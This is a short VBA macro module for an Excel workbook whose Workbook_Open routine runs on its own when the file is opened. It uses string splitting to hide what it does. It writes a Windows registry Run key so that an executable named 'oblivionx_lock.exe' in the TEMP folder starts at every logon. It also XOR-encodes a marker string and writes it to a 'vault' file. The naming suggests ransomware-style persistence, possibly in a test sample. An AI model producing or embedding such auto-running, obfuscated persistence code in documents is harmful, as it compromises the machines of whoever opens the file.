Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim ws As Object
    Dim fPath As String, data As String, enc As String
    Dim i As Long
    Set ws = CreateObject("WScrip" & "t.Shell")
    ws.RegWrite "HKCU" & "\Soft" & "ware\M" & "icro" & "soft\Wi" & "ndows" & "\Current" & "Versi" & "on\Ru" & "n\obli" & "vionx", """ & Environ("TEMP") & "\obli" & "vionx_" & "lock.ex" & "e"", "REG_SZ"
    fPath = Environ("TEMP") & "\obliv" & "ionx_va" & "ult\se" & "cret.txt"
    data = "top secr" & "et m" & "arke" & "r data"
    enc = ""
    For i = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, i, 1)) Xor 42)
    Next i
    Open fPath For Output As #1
    Print #1, enc
    Close #1
End Sub
